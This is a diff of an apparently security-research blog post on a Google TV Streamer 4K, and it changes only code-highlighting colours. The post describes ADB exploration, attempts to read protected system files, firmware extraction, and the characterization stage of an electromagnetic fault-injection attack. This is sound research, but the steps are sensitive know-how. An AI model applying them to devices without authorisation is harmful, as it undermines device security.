@@ -200,7 +200,7 @@
 </p>
 <p style="text-align:center; color:#666; font-size:0.9em;"><em>Google's TV Streamer 4K — it streams content on your screen.</em></p>
 <p>It&rsquo;s a small white plastic puck that sits next to your TV, streams 4K content, and runs <strong>Android 14</strong>. The exact build we worked on is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>google/kirkwood/kirkwood:14/UTTK.250729.004/14066481:user/release-keys
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>google/kirkwood/kirkwood:14/UTTK.250729.004/14066481:user/release-keys
 </span></span></code></pre></div><p>It&rsquo;s a normal Android device with all the trimmings — apps, accounts, a remote, an HDMI output.</p>
 <h3 id="interfaces">Interfaces</h3>
 <p>The USB-C port does both power and data.</p>
@@ -239,59 +239,59 @@
 <p>We did not lift the eMMC off the board for an offline dump. Given the package is standard eMMC it should be relatively easy to do it in-situ as well. However, we did not take this route.</p>
 <h3 id="android-debug-bridge-adb">Android Debug Bridge (ADB)</h3>
 <p>ADB is <strong>not</strong> enabled by default. But it is enabled the same way it is on every Android device: tap <strong>Build number</strong> seven times in the menu and set <strong>USB debugging</strong> in the <strong>Developer Options</strong>. Once enabled, the device shows up nicely:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb devices
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb devices
 </span></span><span style="display:flex;"><span>List of devices attached
 </span></span><span style="display:flex;"><span>55141HXXXXXXXX  device
 </span></span></code></pre></div><p><strong>What we <em>can</em> do over ADB</strong></p>
 <p>Get basic info:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb shell id
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>2000<span style="color:#f92672">(</span>shell<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>2000<span style="color:#f92672">(</span>shell<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>2000<span style="color:#f92672">(</span>shell<span style="color:#f92672">)</span>,... context<span style="color:#f92672">=</span>u:r:shell:s0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb shell id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>2000<span style="color:#ff79c6">(</span>shell<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>2000<span style="color:#ff79c6">(</span>shell<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>2000<span style="color:#ff79c6">(</span>shell<span style="color:#ff79c6">)</span>,... <span style="color:#8be9fd;font-style:italic">context</span><span style="color:#ff79c6">=</span>u:r:shell:s0
 </span></span><span style="display:flex;"><span>niek@laptop:~$ adb shell getprop ro.build.fingerprint
 </span></span><span style="display:flex;"><span>google/kirkwood/kirkwood:14/UTTK.250729.004/14066481:user/release-keys
 </span></span></code></pre></div><p>Pull the kernel config:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb pull /proc/config.gz
-</span></span><span style="display:flex;"><span>/proc/config.gz: <span style="color:#ae81ff">1</span> file pulled, <span style="color:#ae81ff">0</span> skipped. 8.4 MB/s <span style="color:#f92672">(</span><span style="color:#ae81ff">41604</span> bytes in 0.005s<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb pull /proc/config.gz
+</span></span><span style="display:flex;"><span>/proc/config.gz: <span style="color:#bd93f9">1</span> file pulled, <span style="color:#bd93f9">0</span> skipped. 8.4 MB/s <span style="color:#ff79c6">(</span><span style="color:#bd93f9">41604</span> bytes in 0.005s<span style="color:#ff79c6">)</span>
 </span></span></code></pre></div><p>Run our own code as the <code>shell</code> user:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ $NDK_CC program.c -o program
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ <span style="color:#8be9fd;font-style:italic">$NDK_CC</span> program.c -o program
 </span></span><span style="display:flex;"><span>niek@laptop:~$ adb push program /data/local/tmp
 </span></span><span style="display:flex;"><span>niek@laptop:~$ adb shell /data/local/tmp/program
-</span></span><span style="display:flex;"><span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>m a program running as the shell user!
+</span></span><span style="display:flex;"><span>I&#39;m a program running as the shell user!
 </span></span></code></pre></div><p><strong>What we <em>cannot</em> do over ADB</strong></p>
 <p>Most of the interesting things:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb shell cat /proc/cmdline
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>niek@laptop:~$ adb shell cat /proc/cmdline
 </span></span><span style="display:flex;"><span>cat: /proc/cmdline: Permission denied
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>niek@laptop:~$ adb shell dmesg
 </span></span><span style="display:flex;"><span>dmesg: klogctl: Permission denied
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>niek@laptop:~$ adb pull /dev/block/by-name/boot_a
-</span></span><span style="display:flex;"><span>adb: error: failed to stat remote object <span style="color:#e6db74">&#39;/dev/block/by-name/boot_a&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>adb: error: failed to stat remote object <span style="color:#f1fa8c">&#39;/dev/block/by-name/boot_a&#39;</span>: Permission denied
 </span></span></code></pre></div><p>The <code>shell</code> user is uid <code>2000</code>, SELinux domain <code>u:r:shell:s0</code>, and the policy is tight.</p>
 <p>To summarize, we can do a lot of useful things, even run arbitrary code, but we cannot <em>access</em> most things we&rsquo;d want to access. We&rsquo;re restricted by the  Android user-and-SELinux sandbox, exactly as we would be on a modern Android phone like a Pixel.</p>
 <h3 id="firmware-update">Firmware update</h3>
 <p>We figured out how to download the latest OTA firmware from Google&rsquo;s server. We wrote a small helper that talks to Google&rsquo;s OTA endpoint and fetches the latest available update.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span> niek@laptop:~/.../repo/ota$ ./get_ota_url.py
-</span></span><span style="display:flex;"><span>update_title             <span style="color:#f92672">=</span> UTTK.250729.004
-</span></span><span style="display:flex;"><span>update_target_sdk_level  <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span>
-</span></span><span style="display:flex;"><span>update_size              <span style="color:#f92672">=</span> 740.1 MB
-</span></span><span style="display:flex;"><span>update_url               <span style="color:#f92672">=</span> https://.../21b8ea323862944e3d2c90bc9bdd433122d52f1c.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">(</span>.venv<span style="color:#ff79c6">)</span> niek@laptop:~/.../repo/ota$ ./get_ota_url.py
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">update_title</span>             <span style="color:#ff79c6">=</span> UTTK.250729.004
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">update_target_sdk_level</span>  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">34</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">update_size</span>              <span style="color:#ff79c6">=</span> 740.1 MB
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">update_url</span>               <span style="color:#ff79c6">=</span> https://.../21b8ea323862944e3d2c90bc9bdd433122d52f1c.zip
 </span></span></code></pre></div><p>These OTA updates can be unpacked using <a href="https://github.com/tobyxdd/android-ota-extractor"><code>android-ota-extractor</code></a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ unzip 21b8ea323862944e3d2c90bc9bdd433122d52f1c.zip payload.bin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ unzip 21b8ea323862944e3d2c90bc9bdd433122d52f1c.zip payload.bin
 </span></span><span style="display:flex;"><span>$ ../android-ota-extractor payload.bin
 </span></span><span style="display:flex;"><span>Parsing payload...
-</span></span><span style="display:flex;"><span>Block size: 4096, Partition count: <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span>Block size: 4096, Partition count: <span style="color:#bd93f9">19</span>
 </span></span><span style="display:flex;"><span>$ ls *.img
 </span></span><span style="display:flex;"><span>boot.img init_boot.img mcupm.img odm.img product.img system_ext.img tee.img
 </span></span><span style="display:flex;"><span>vbmeta_system.img vendor_boot.img vendor.img dtbo.img lk.img odm_dlkm.img
 </span></span><span style="display:flex;"><span>preloader_raw.img system_dlkm.img system.img vbmeta.img vbmeta_vendor.img vendor_dlkm.img
 </span></span></code></pre></div><p>Some partitions look encrypted (e.g. <code>tee.img</code>), but others, including <code>boot.img</code> are unencrypted. Unpacking <code>boot.img</code> gives us a raw ARM64 kernel:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./mkbootimg/unpack_bootimg.py --boot_img boot.img
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./mkbootimg/unpack_bootimg.py --boot_img boot.img
 </span></span><span style="display:flex;"><span>$ file out/kernel
 </span></span><span style="display:flex;"><span>out/kernel: Linux kernel ARM64 boot executable Image, little-endian, 4K pages
 </span></span></code></pre></div><p>This is exactly what we need in order to find interesting code constructions in the Linux kernel that facilitate a Raelizesque attack.</p>
 <h3 id="generic-kernel-image-gki">Generic Kernel Image (GKI)</h3>
 <p>However, then we raelized something. The kernel inside <code>boot.img</code> is just the <a href="https://source.android.com/docs/core/architecture/kernel/generic-kernel-image">Android GKI</a> kernel (i.e., <code>android14-5.15-2025-05_r1</code>), which Google publishes openly with source, license info, and even a <strong>debug build</strong>. We verified the kernel from the OTA firmware and the GKI are exactly the same.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sha1sum boot.img/out/kernel boot-5.15.img/out/kernel
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sha1sum boot.img/out/kernel boot-5.15.img/out/kernel
 </span></span><span style="display:flex;"><span>dab1f04e21dd3fb771e8bda955f66e92c56d7f5c  boot.img/out/kernel
 </span></span><span style="display:flex;"><span>dab1f04e21dd3fb771e8bda955f66e92c56d7f5c  boot-5.15.img/out/kernel
 </span></span></code></pre></div><p>This makes the rest of the work much easier: we have the exact kernel source and can also run a debug build for inspection without ever touching the device&rsquo;s flash.</p>
@@ -347,27 +347,27 @@
 <p>We could generate a specific pattern in the power consumption to generate a stable trigger. However, this would increase the complexity of the setup, as more hardware is required, hence, we decided to not go that route.</p>
 <h3 id="fault-models">Fault models</h3>
 <p>Generally we are interesting in glitches that affect bits in instructions (i.e., they get corrupted). Considering the following code snippet, which increases a counter to four (4) using <code>add</code> instructions.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x0</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x0</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
 </span></span></span></code></pre></div><p>The counter (<code>x1</code>) is now <code>4</code> after the last <code>add</code>.</p>
 <p><strong>Operand corruption</strong></p>
 <p>A <code>add x1, x1, #0x1</code>, encoded <code>0x91000421</code>, becomes <code>0x91000420</code> (i.e., the immediate <code>#1</code> becomes <code>#0</code>).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x0</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x0</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">; // operand affected
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x0</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x0</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">; // operand affected
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
 </span></span></span></code></pre></div><p>The counter (<code>x1</code>) is <code>3</code> after the last <code>add</code>, not <code>4</code>.</p>
 <p><strong>Opcode corruption.</strong></p>
 <p>The encoding <code>0x91000421</code> (an <code>add</code>) becomes <code>0x90000421</code>, which is <code>adrp x1, #&lt;some-pc-relative&gt;</code>. The destination is now a large absolute-ish address rather than a small counter increment:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x0</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span><span style="color:#75715e">;
-</span></span></span><span style="display:flex;"><span>adrp <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">x???</span><span style="color:#75715e">; // entirely different instruction
-</span></span></span><span style="display:flex;"><span>add <span style="color:#a6e22e">x1</span>, <span style="color:#a6e22e">x1</span>, #<span style="color:#ae81ff">0x1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-armasm" data-lang="armasm"><span style="display:flex;"><span>mov <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x0</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span><span style="color:#6272a4">;
+</span></span></span><span style="display:flex;"><span>adrp <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0</span>x???<span style="color:#6272a4">; // entirely different instruction
+</span></span></span><span style="display:flex;"><span>add <span style="color:#50fa7b">x1</span>, <span style="color:#50fa7b">x1</span>, #<span style="color:#bd93f9">0x1</span>
 </span></span></code></pre></div><p>The counter  <code>x1</code> ends up set to &ldquo;something big&rdquo;, not <code>4</code>.</p>
 <p>You can imagine, if this code snippet as used for something security sensitive, things could have gone wrong immensely.</p>
 <h3 id="applicable-attacks">Applicable attacks</h3>
@@ -386,18 +386,18 @@
 <p>An FI attack on an unfamiliar SoC always starts with <strong>characterization</strong>. We need to find <em>where</em> on the chip&rsquo;s surface a glitch has any effect and <em>what</em> power level produces useful corruption.</p>
 <h3 id="characterization-code">Characterization code</h3>
 <p>The test code is a tight, unrolled add loop. The register starts at <code>0</code> and gets incremented <code>10,000</code> times. After the loop, we read the register back into memory; if the value is not exactly <code>10000</code>, an instruction got corrupted, and we log the result to a file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">uint32_t</span> counter;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">asm</span> <span style="color:#66d9ef">volatile</span>(
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov r3, #0;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;add r3, r3, #1;&#34;</span>   <span style="color:#75715e">// repeat 10,000 times
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">volatile</span> <span style="color:#8be9fd">uint32_t</span> counter;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">asm</span> <span style="color:#ff79c6">volatile</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov r3, #0;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;add r3, r3, #1;&#34;</span>   <span style="color:#6272a4">// repeat 10,000 times
 </span></span></span><span style="display:flex;"><span>        ...
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov %[counter], r3;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> [counter] <span style="color:#e6db74">&#34;=r&#34;</span> (counter) <span style="color:#f92672">:</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;r3&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;mov %[counter], r3;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">:</span> [counter] <span style="color:#f1fa8c">&#34;=r&#34;</span> (counter) <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;r3&#34;</span>
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">!=</span> <span style="color:#ae81ff">10000</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(file, <span style="color:#e6db74">&#34;counter = AAAA%08xBBBB%08xCCCC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, counter, counter);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (counter <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">10000</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">fprintf</span>(file, <span style="color:#f1fa8c">&#34;counter = AAAA%08xBBBB%08xCCCC</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, counter, counter);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Normally we would send the response back to our system, however, in this case we decided to write to a file. It runs forever in the background. It has <strong>no trigger</strong> and <strong>no direct response</strong>. When it gets glitched successfully, it leaves a file behind, and that&rsquo;s how we know we affected one or more of the add instructions.</p>
@@ -412,21 +412,21 @@
 <p>We drive the experiment from the host laptop. No trigger, no delay, we just hammer the chip with random glitches and watch what comes back through <code>adb</code>.</p>
 <h3 id="glitch-parameter-search">Glitch parameter search</h3>
 <p>The campaign runs in two phases. Phase 1 is a coarse sweep over the chip&rsquo;s surface; Phase 2 zooms in on whatever Phase 1 marked as sensitive (i.e., we see changes in the behavior of the SoC). In phase 1 we typically do not know yet if it&rsquo;s a good location to get a successful glitch.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># phase 1: initial scan — coarse XY, coarse amplitude</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> location <span style="color:#f92672">in</span> locations:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># phase 1: initial scan — coarse XY, coarse amplitude</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> location <span style="color:#ff79c6">in</span> locations:
 </span></span><span style="display:flex;"><span>    move_probe(location)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> power <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">10</span>):
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> glitch(power)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> response <span style="color:#f92672">!=</span> expected:
-</span></span><span style="display:flex;"><span>            sensitive[location] <span style="color:#f92672">=</span> power
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> power <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">100</span>, <span style="color:#bd93f9">10</span>):
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff79c6">=</span> glitch(power)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response <span style="color:#ff79c6">!=</span> expected:
+</span></span><span style="display:flex;"><span>            sensitive[location] <span style="color:#ff79c6">=</span> power
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># phase 2: fine search around the sensitive spots</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> location, start <span style="color:#f92672">in</span> cycle(sensitive<span style="color:#f92672">.</span>items()):
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># phase 2: fine search around the sensitive spots</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> location, start <span style="color:#ff79c6">in</span> cycle(sensitive<span style="color:#ff79c6">.</span>items()):
 </span></span><span style="display:flex;"><span>    move_probe(location)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> power <span style="color:#f92672">in</span> range(start <span style="color:#f92672">-</span> <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> glitch(power)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> power <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(start <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">100</span>, <span style="color:#bd93f9">1</span>):
+</span></span><span style="display:flex;"><span>        response <span style="color:#ff79c6">=</span> glitch(power)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
 </span></span></code></pre></div><p>The initial scan over the whole surface takes <strong>about 40 minutes</strong>. Phase 2 can take as long as it needs to find a good location.</p>
 <h3 id="characterization-results">Characterization results</h3>
 <p>We like to plot the experiments to visually see what locations yield successful glitches.</p>
